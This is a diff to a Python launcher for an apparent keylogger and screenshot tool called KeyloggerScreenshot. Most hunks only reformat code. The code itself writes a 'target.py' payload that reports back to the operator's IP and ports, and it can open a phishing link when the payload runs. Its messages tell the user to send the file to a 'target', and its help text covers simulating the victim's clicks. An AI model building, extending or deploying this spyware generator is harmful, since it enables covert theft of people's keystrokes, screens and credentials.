@@ -167,8 +167,7 @@ threading_server4.start() '''
                 try:
                     if "-cf" not in lst:
                         print(gui)
-                        print(
-                            'YOU HAVE NOT CREATED A FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
+                        print('YOU HAVE NOT CREATED A FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
                         sys.exit()
                     if "-" in lst[idx_s + 1]:
                         print(gui)
@@ -187,6 +186,7 @@ threading_server4.start() '''
                 seconds = 60
 
             if "-phs" in lst:
+                global phishing_name
                 phishing_name = None
                 try:
                     phs_idx = lst.index("-phs")
@@ -220,7 +220,6 @@ threading_server4.start() '''
                     phishing_value = None
 
                 try:
-
                     filename = lst[idx_cf + 1]
                     if not filename.endswith("py"):
                         data = filename.split(".")
@@ -228,21 +227,19 @@ threading_server4.start() '''
                     if "-" in filename:
                         filename = "target.py"
 
+                    print(filename)
                     if os.path.exists(filename):
                         os.remove(filename)
 
-                    if phishing_name is not None: print(
-                        f'LINK: {phishing_name} WILL BE OPEND WHEN {filename} IS EXECUTED')
+                    if phishing_name is not None: print(f'LINK: {phishing_name} WILL BE OPEND WHEN {filename} IS EXECUTED')
 
                     with open(f"{filename}", "a+") as file:
-                        file.write(
-                            f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
+                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
                     print(f"{filename.upper()} has been created")
 
                 except IndexError:
                     with open("target.py", "a+") as file:
-                        file.write(
-                            f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
+                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
                     print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")
 
             server_photos = ks.ServerPhotos(ipaddress, port_photos)
@@ -280,5 +277,4 @@ threading_server4.start() '''
             "\n-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET\n-sim ACTIVATES SIMULATION\n-phs OPENS A LINK WHEN THE KEYLOGGER IS EXECUTED\n\n\nIF 'Simulation_code.py' IS IN YOUR DIRECTORY YOU CAN SIMULATE THE CLICKS THE TARGET HAS MADE IF IT HASN'T WORKD ON THE ACTUAL CODE")
 
 except OSError:
-    print(
-        'CHECK YOUR IP-ADDRESS WITH "ipconfig" ON WINDOWS AND "ifconfig" ON LINUX\n\nIF YOU HAVE THE CORRECT IP ADDRESSS AND IT STILL DOESNT WORK YOU CAN MODIFY YOUR IP ON "keylogger_server.py" AND "keylogger_target.py".\nAFTER THAT YOU CAN SEND THE TARGET OBVIOUSLY THE FILE "keylogger_target.py"')
+    print('CHECK YOUR IP-ADDRESS WITH "ipconfig" ON WINDOWS AND "ifconfig" ON LINUX\n\nIF YOU HAVE THE CORRECT IP ADDRESSS AND IT STILL DOESNT WORK YOU CAN MODIFY YOUR IP ON "keylogger_server.py" AND "keylogger_target.py".\nAFTER THAT YOU CAN SEND THE TARGET OBVIOUSLY THE FILE "keylogger_target.py"')
